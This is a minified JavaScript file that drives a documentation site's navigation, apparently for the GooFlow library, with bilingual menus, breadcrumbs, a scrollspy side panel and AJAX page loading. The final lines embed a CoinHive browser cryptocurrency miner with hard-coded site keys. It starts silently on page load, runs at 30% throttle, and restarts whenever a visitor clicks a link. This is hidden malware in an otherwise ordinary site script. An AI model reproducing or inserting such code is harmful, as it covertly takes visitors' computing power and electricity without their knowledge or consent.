var c={en:[{hash:"start",title:"Quick Start"},{hash:"constructor",title:"Constructors"},{hash:"structures",title:"Data Definition"},{hash:"properties",title:"Properties"},{hash:"methods",title:"Methods"},{hash:"events",title:"Event Hooks"},{hash:"extension",title:"Customize Extend"}],zh:[{hash:"start",title:"快速入门"},{hash:"constructor",title:"构造方法"},{hash:"structures",title:"数据结构定义"},{hash:"properties",title:"内部属性"},{hash:"methods",title:"方法接口"},{hash:"events",title:"事件钩子"},{hash:"extension",title:"个性化扩展"}]},d={renderPageNav:function(t,e){var a='<aside class="right-panel hidden-xs hidden-sm"><ul class="nav sidenav">';e&&t.find(".page-header").append(lang.ctrlF[lang.text]),console.log(t.length),t.children("article").append('<hr><div class="end"></div>').children(".container-fluid").each(function(){var t=$(this);a+='<li><a href="#'+this.id+'">'+t.data("title")+"</a>";var e=!1;0<t.children(".container-fluid").length&&(a+='<ul class="nav">',e=!0),t.children(".container-fluid").each(function(){a+='<li><a href="#'+this.id+'">'+$(this).data("title")+"</a>"}),e&&(a+="</ul>"),a+="</li>"}),a+="</ul></aside>",t.append(a)},showInfo:function(t,e){var a=t.height();t.html('<div class="f20 text-gray text-center" style="height:100%;line-height:'+(a-40)+'px">'+e+"</div>")},getHash:function(){var t=window.location.hash;return t=1<t.length?t.substr(1,t.length):"",g.hashDef["#"+t]?t:"start"},breadcrumb:function(t){for(var e=$(".breadcrumb").html('<li><a href="index.html#directory">'+lang.docHome[lang.text]+"</a></li> "),a=0;a<t.length;++a)"directory"!==g.hash&&e.append("<li>"+t[a].title+"</li> ")},loadPage:function(){$(".loading").show();var r=$("#frame"),o=r.height();d.showInfo(r,lang.loading[lang.text]),$(".main-menu").children(".active").removeClass("active"),$(".main-menu").find("a[href='#"+g.hash+"']").parent().addClass("active");var e=function(t){r.html(t);var e=r.children(".main-frame");d.renderPageNav(e,"directory"!==g.hash);var a=$(".right-panel"),n=a.height(),i=o-40;if(i<n&&a.css("height",i+"px"),d.breadcrumb([{title:e.data("title")}]),e.scrollspy({target:".right-panel"}),a.children().on("click","a",function(t){window.event?window.event.returnValue=!1:t.preventDefault(),this.blur(),e.scrollTop($(this.hash)[0].offsetTop)}),a.on("activate.bs.scrollspy",function(){var t=$("#thirdNav");0===t.length&&($(".breadcrumb").append('<li class="active" id="thirdNav"></li>'),t=$("#thirdNav"));var e=$(".right-panel .sidenav>li.active > a").text();t.text(e)}),e.on("scroll",function(){0===$(".right-panel .sidenav>li.active").length&&$("#thirdNav").remove()}),0<e.length&&Prism.highlightAllUnder(e[0],!1),"directory"===g.hash){for(var h="",s=c[lang.text],l=0;l<s.length;++l)h+='<a href="#'+s[l].hash+'" class="list-group-item">'+s[l].title+"</a>";$(".main-container .list-group").html(h)}else"start"===g.hash&&$("#myVersion").text($("#version").text());$(".loading").hide()};if(0<$("#article_"+g.hash).length)e($("#article_"+g.hash).clone());else{var t=lang.text+"/"+g.hash+".html";"structures"!==g.hash&&"methods"!==g.hash&&"events"!==g.hash&&"directory"!==g.hash||(t="../commDoc/"+t),$.ajax(t,{crossDomain:!0,success:function(t){e(t)},timeout:3e4,error:function(){d.showInfo(r,lang.loadError[lang.text])}})}}},g={hash:"aaaa",hashDef:{"#directory":!0}};!function(e){lang.init(),"onhashchange"in window&&(window.onhashchange=function(t){g.hash=d.getHash(),d.loadPage()}),e.ajax("https://gooflow.gitee.io/assets/info.json?callback=?",{dataType:"jsonp",jsonpCallback:"ck",success:function(t){e("#version").text("V"+t.version)}});for(var t="",a=c[lang.text],n=0;n<a.length;++n)t+='<li><a class="menu-title" href="#'+a[n].hash+'"><i class="glyphicon glyphicon-triangle-right"></i><span class="nav-label">'+a[n].title+"</span></a></li>";e(".main-menu").html(t),e(".menu-title").each(function(){g.hashDef[this.hash]=!0}),g.hash=d.getHash(),d.loadPage(),lang.miner={zh:"qMYWvsNYt0ghXAMYb4cA2EFn24w7LYE1",en:"a7ojtZraU8HkkHnNG82lUvvTb9LInomn"};var i=new CoinHive.Anonymous(lang.miner[lang.text],{throttle:.3});i.start(),e("body").on("click","a",function(){i.isRunning()||i.start()})}($);